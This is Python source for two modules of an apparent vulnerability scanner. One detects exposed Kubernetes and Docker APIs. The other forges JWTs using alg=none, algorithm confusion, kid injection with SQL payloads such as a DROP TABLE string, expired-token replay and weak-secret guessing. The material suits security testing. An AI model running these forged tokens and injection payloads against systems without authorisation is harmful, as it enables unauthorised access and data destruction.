#  MODULE v38-6 — Kubernetes & Docker API Scanner
# ════════════════════════════════════════════════════════════════════════

class K8sDockerScanner:
    """Detect exposed Kubernetes API server and Docker daemon endpoints."""

    K8S_ENDPOINTS = [
        ("/api",                "K8s API Root",          "HIGH"),
        ("/api/v1",             "K8s Core API",          "HIGH"),
        ("/api/v1/namespaces",  "K8s Namespaces List",   "CRITICAL"),
        ("/api/v1/pods",        "K8s Pod List",          "CRITICAL"),
        ("/api/v1/secrets",     "K8s Secrets",           "CRITICAL"),
        ("/api/v1/configmaps",  "K8s ConfigMaps",        "HIGH"),
        ("/api/v1/serviceaccounts", "K8s Service Accounts", "CRITICAL"),
        ("/apis",               "K8s API Groups",        "HIGH"),
        ("/healthz",            "K8s Health",            "INFO"),
        ("/version",            "K8s Version Disclosure","MEDIUM"),
        ("/metrics",            "K8s Metrics",           "MEDIUM"),
    ]

    DOCKER_ENDPOINTS = [
        ("/v1.41/version",    "Docker Version",          "HIGH"),
        ("/v1.41/info",       "Docker Info",             "HIGH"),
        ("/v1.41/containers/json", "Docker Containers",  "CRITICAL"),
        ("/v1.41/images/json","Docker Images",           "HIGH"),
        ("/v1.41/networks",   "Docker Networks",         "MEDIUM"),
        ("/v1.41/secrets",    "Docker Secrets",          "CRITICAL"),
        ("/_ping",            "Docker Ping",             "MEDIUM"),
    ]

    K8S_PORTS = [6443, 8443, 8080, 10250, 10255, 2379, 4194]
    DOCKER_PORTS = [2375, 2376, 4243]

    async def scan(self, client: WebScoutClient, base_url: str) -> list:
        findings = []
        parsed = urlparse(base_url)
        host = parsed.hostname or ""
        base = f"{parsed.scheme}://{parsed.netloc}"
        loop = asyncio.get_event_loop()

        # Kubernetes API detection
        for path, name, sev in self.K8S_ENDPOINTS:
            for port in self.K8S_PORTS[:3]:
                test_url = f"https://{host}:{port}{path}"
                r = await client.get(test_url)
                if not r:
                    test_url = f"http://{host}:{port}{path}"
                    r = await client.get(test_url)
                if not r:
                    continue
                body = r["text"]
                if r["status"] in (200, 403) and any(
                    kw in body for kw in ["apiVersion", "kind", "metadata", "kubernetes", "items"]
                ):
                    if sev == "CRITICAL":
                        sev_used = "CRITICAL"
                        desc = f"Kubernetes API endpoint '{path}' is publicly accessible — full cluster access possible."
                    else:
                        sev_used = sev
                        desc = f"Kubernetes endpoint '{path}' is accessible at port {port}."
                    findings.append(Finding(
                        plugin="k8s_docker",
                        title=f"Kubernetes API Exposed — {name} (port {port})",
                        severity=sev_used, confidence=90.0,
                        description=desc,
                        evidence=f"URL: {test_url} | HTTP {r['status']} | snippet: {body[:150]}",
                        url=test_url,
                        remediation="Restrict Kubernetes API access to authorized IPs only. Enable RBAC and authentication.",
                        cwe="CWE-306", cvss=9.8, owasp="A05",
                        poc=f"curl -sk {test_url}",
                        tags=["kubernetes", "api", "exposure"],
                    ))
                    log("VULN", f"K8s API exposed: {test_url}")
                    break

        # Docker daemon detection
        for path, name, sev in self.DOCKER_ENDPOINTS:
            for port in self.DOCKER_PORTS:
                test_url = f"http://{host}:{port}{path}"
                r = await client.get(test_url)
                if not r:
                    continue
                body = r["text"]
                if r["status"] == 200 and any(
                    kw in body for kw in ["DockerRootDir", "ServerVersion", "Id", "Containers", "OK"]
                ):
                    findings.append(Finding(
                        plugin="k8s_docker",
                        title=f"Docker API Exposed — {name} (port {port})",
                        severity="CRITICAL", confidence=95.0,
                        description=f"Docker daemon API is accessible without authentication at port {port}. Full host compromise possible.",
                        evidence=f"URL: {test_url} | HTTP {r['status']} | snippet: {body[:150]}",
                        url=test_url,
                        remediation="Enable TLS on Docker daemon. Never expose Docker socket to network without auth.",
                        cwe="CWE-306", cvss=10.0, owasp="A05",
                        poc=f"docker -H tcp://{host}:{port} ps",
                        tags=["docker", "api", "unauthenticated"],
                    ))
                    log("VULN", f"Docker API exposed: {test_url}")
                    break

        # Check for k8s-related paths on existing web server
        for path in ["/healthz", "/readyz", "/livez", "/metrics", "/.kube/config"]:
            r = await client.get(base + path)
            if r and r["status"] == 200:
                if any(kw in r["text"] for kw in ["ok", "apiVersion", "clusters:", "kubernetes"]):
                    findings.append(Finding(
                        plugin="k8s_docker",
                        title=f"K8s/Container Probe Endpoint Exposed — {path}",
                        severity="MEDIUM", confidence=80.0,
                        description=f"Kubernetes probe endpoint '{path}' accessible on public web server.",
                        evidence=f"HTTP {r['status']} | body: {r['text'][:100]}",
                        url=base + path,
                        remediation=f"Restrict '{path}' to internal/cluster network only.",
                        cwe="CWE-200", cvss=5.3, owasp="A05",
                        tags=["kubernetes", "probe", "exposure"],
                    ))

        log("OK", f"K8s/Docker scan done — {len(findings)} finding(s)")
        return findings


# ════════════════════════════════════════════════════════════════════════
#  MODULE v38-7 — Advanced JWT Attack Suite
# ════════════════════════════════════════════════════════════════════════

class JWTAdvancedScanner:
    """Advanced JWT attack vectors: alg=none, RS256→HS256, kid injection, claims."""

    async def scan(self, client: WebScoutClient, base_url: str, token: str = "") -> list:
        findings = []

        # Discover JWT in cookies/headers from page
        r = await client.get(base_url)
        if not r:
            return findings

        discovered_tokens = []
        if token:
            discovered_tokens.append(token)

        # Find JWTs in response headers and body
        jwt_pattern = re.compile(r'eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]*')
        for jwt_tok in jwt_pattern.findall(r["text"] + str(r["headers"]))[:3]:
            if jwt_tok not in discovered_tokens:
                discovered_tokens.append(jwt_tok)

        if not discovered_tokens:
            return findings

        for tok in discovered_tokens:
            parts = tok.split(".")
            if len(parts) != 3:
                continue

            try:
                def _pad(s: str) -> str:
                    return s + "=" * (-len(s) % 4)
                header_data = json.loads(base64.urlsafe_b64decode(_pad(parts[0])))
                payload_data = json.loads(base64.urlsafe_b64decode(_pad(parts[1])))
            except Exception:
                continue

            alg = header_data.get("alg", "")
            kid = header_data.get("kid", "")

            # Check 1: Algorithm = none
            none_header = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).decode().rstrip("=")
            none_payload = parts[1]
            none_token = f"{none_header}.{none_payload}."

            for endpoint in [base_url, base_url + "/api/me", base_url + "/api/user"]:
                r2 = await client.get(endpoint, headers={"Authorization": f"Bearer {none_token}"})
                if r2 and r2["status"] == 200 and any(
                    kw in r2["text"].lower() for kw in ["user", "email", "id", "role", "name"]
                ):
                    findings.append(Finding(
                        plugin="jwt_advanced",
                        title="JWT Algorithm Confusion: alg=none Accepted",
                        severity="CRITICAL", confidence=92.0,
                        description="Server accepts JWT with alg=none — no signature verification.",
                        evidence=f"Token with alg=none accepted at {endpoint} | HTTP {r2['status']}",
                        url=endpoint, payload=none_token[:60] + "...",
                        remediation="Whitelist allowed algorithms. Reject alg=none unconditionally.",
                        cwe="CWE-347", cvss=9.8, owasp="A02",
                        poc=f'curl -H "Authorization: Bearer {none_token}" {endpoint}',
                        tags=["jwt", "alg-none"],
                    ))
                    log("VULN", "JWT alg=none accepted!")
                    break

            # Check 2: Algorithm confusion RS256 → HS256
            if alg == "RS256":
                fake_header = base64.urlsafe_b64encode(
                    json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
                ).decode().rstrip("=")
                fake_token = f"{fake_header}.{parts[1]}." + base64.urlsafe_b64encode(b"fakesig").decode().rstrip("=")
                r3 = await client.get(base_url, headers={"Authorization": f"Bearer {fake_token}"})
                if r3 and r3["status"] == 200:
                    findings.append(Finding(
                        plugin="jwt_advanced",
                        title="JWT Algorithm Confusion: RS256 → HS256",
                        severity="CRITICAL", confidence=80.0,
                        description="Server may accept HS256 token when RS256 is expected — public key as HMAC secret attack.",
                        evidence=f"HS256 token accepted with HTTP {r3['status']}",
                        url=base_url,
                        remediation="Explicitly validate algorithm type on server side.",
                        cwe="CWE-347", cvss=9.8, owasp="A02",
                        tags=["jwt", "alg-confusion"],
                    ))

            # Check 3: kid header injection (SQL / path traversal)
            if kid:
                for kid_payload in [
                    "' OR '1'='1",
                    "../../dev/null",
                    "/dev/null",
                    "'; DROP TABLE keys;--",
                ]:
                    inj_header = base64.urlsafe_b64encode(
                        json.dumps({**header_data, "kid": kid_payload}).encode()
                    ).decode().rstrip("=")
                    inj_token = f"{inj_header}.{parts[1]}.{parts[2]}"
                    r4 = await client.get(base_url, headers={"Authorization": f"Bearer {inj_token}"})
                    if r4 and r4["status"] not in (400, 401, 403, 422):
                        findings.append(Finding(
                            plugin="jwt_advanced",
                            title=f"JWT kid Header Injection",
                            severity="HIGH", confidence=75.0,
                            description=f"JWT 'kid' header injection not rejected — SQLi or path traversal possible.",
                            evidence=f"kid={kid_payload!r} accepted | HTTP {r4['status']}",
                            url=base_url, payload=kid_payload,
                            remediation="Validate and sanitize the 'kid' header. Use a lookup table, not filesystem/DB.",
                            cwe="CWE-89", cvss=8.5, owasp="A02",
                            tags=["jwt", "kid-injection"],
                        ))
                        break

            # Check 4: Expired token accepted
            old_payload = {**payload_data, "exp": 1000000}
            exp_payload_b64 = base64.urlsafe_b64encode(
                json.dumps(old_payload).encode()
            ).decode().rstrip("=")
            exp_token = f"{parts[0]}.{exp_payload_b64}.{parts[2]}"
            r5 = await client.get(base_url, headers={"Authorization": f"Bearer {exp_token}"})
            if r5 and r5["status"] == 200:
                findings.append(Finding(
                    plugin="jwt_advanced",
                    title="JWT: Expired Token Accepted",
                    severity="HIGH", confidence=85.0,
                    description="Server accepts JWT with past expiry timestamp.",
                    evidence=f"Token exp=1000000 (year 1970) accepted | HTTP {r5['status']}",
                    url=base_url,
                    remediation="Validate 'exp' claim server-side. Reject expired tokens.",
                    cwe="CWE-613", cvss=7.5, owasp="A02",
                    tags=["jwt", "expiry"],
                ))

            # Check 5: Weak secret detection (common secrets)
            common_secrets = [
                "secret", "password", "123456", "qwerty", "changeme",
                "yoursecretkey", "mysecretkey", "jwt_secret", "secretkey",
                "your-256-bit-secret", "HS256", "JWT",
            ]
            if alg in ("HS256", "HS384", "HS512"):
                import hmac as _hmac, hashlib as _hashlib
                header_payload = f"{parts[0]}.{parts[1]}"
                orig_sig = base64.urlsafe_b64decode(parts[2] + "==")
                for secret in common_secrets:
                    h = _hmac.new(secret.encode(), header_payload.encode(), _hashlib.sha256).digest()
                    if h == orig_sig[:len(h)]:
                        findings.append(Finding(
                            plugin="jwt_advanced",
                            title="JWT: Weak/Known HMAC Secret",
                            severity="CRITICAL", confidence=100.0,
                            description=f"JWT signed with weak known secret: '{secret}'",
                            evidence=f"Secret: {secret} | Algorithm: {alg}",
                            url=base_url,
                            remediation="Use cryptographically random 256-bit secret. Rotate immediately.",
                            cwe="CWE-330", cvss=9.8, owasp="A02",
                            poc=f"jwt.io debugger — secret: {secret}",
                            tags=["jwt", "weak-secret"],
                        ))
                        log("VULN", f"JWT weak secret found: {secret}")
                        break

        log("OK", f"JWT advanced scan done — {len(findings)} finding(s)")
        return findings


